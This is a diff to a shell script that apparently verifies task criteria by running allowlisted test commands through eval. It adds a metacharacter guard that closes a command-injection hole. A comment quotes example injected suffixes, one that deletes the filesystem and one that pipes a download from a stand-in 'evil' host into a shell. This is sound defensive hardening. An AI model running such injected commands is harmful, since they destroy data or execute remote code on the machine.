@@ -49,6 +49,20 @@ UNKNOWN=0
 FAILED_LIST=""
 UNKNOWN_LIST=""
 
+# Shared H7/H10 allowlist. Exact-prefix match is not enough — a substring match
+# (`grep -qE` with no end-anchor) let "pytest; rm -rf /" or "cargo test && curl
+# evil|sh" match the allowlist and reach `eval` unattended (t-2856 challenger
+# finding 1, MEDIUM: pre-existing in H7, doubled by adding H10 on the same
+# allowlist). allowlisted_command() closes the class for both heuristics at
+# once: reject any command containing shell metacharacters BEFORE the prefix
+# check, so an injected suffix can never ride a legitimate prefix through.
+CMD_ALLOWLIST_RE='^(cargo test|pytest|python -m pytest|bun test|npm test|yarn test|bash tests/|\./tests/)'
+allowlisted_command() {
+    local cmd="$1"
+    echo "$cmd" | grep -qE '[;&|`$(){}<>]' && return 1   # metacharacters → reject
+    echo "$cmd" | grep -qE "$CMD_ALLOWLIST_RE"
+}
+
 for i in $(seq 0 $((CRITERIA_COUNT - 1))); do
     criterion=$(echo "$CRITERIA_JSON" | jq -r ".[$i]" 2>/dev/null) || criterion=""
     [ -z "$criterion" ] && continue
@@ -162,12 +176,11 @@ for i in $(seq 0 $((CRITERIA_COUNT - 1))); do
     fi
 
     # ── Heuristic 7: "{command}" passes ──────────────────────────────────────
-    # Allowlist shared with heuristic 10 (demoable) — one definition, no drift.
-    CMD_ALLOWLIST_RE='^(cargo test|pytest|python -m pytest|bun test|npm test|yarn test|bash tests/|\./tests/)'
+    # Allowlist + metachar guard shared with heuristic 10 (demoable) via
+    # allowlisted_command() — one definition, no drift.
     if echo "$criterion" | grep -qiE '^"[^"]+" passes$'; then
         cmd=$(echo "$criterion" | grep -oE '"[^"]+"' | head -1 | tr -d '"')
-        # Allowlist: only execute known-safe test commands
-        if echo "$cmd" | grep -qE "$CMD_ALLOWLIST_RE"; then
+        if allowlisted_command "$cmd"; then
             if (cd "$WORK_DIR" && eval "$cmd" >/dev/null 2>&1); then
                 PASSED=$((PASSED + 1))
             else
@@ -234,7 +247,7 @@ for i in $(seq 0 $((CRITERIA_COUNT - 1))); do
     # sitting — routed to manual sign-off like any UNKNOWN).
     if echo "$criterion" | grep -qiE '^demoable: .+'; then
         cmd=$(echo "$criterion" | sed 's/^[Dd]emoable: *//')
-        if echo "$cmd" | grep -qE "$CMD_ALLOWLIST_RE"; then
+        if allowlisted_command "$cmd"; then
             if (cd "$WORK_DIR" && eval "$cmd" >/dev/null 2>&1); then
                 PASSED=$((PASSED + 1))
             else
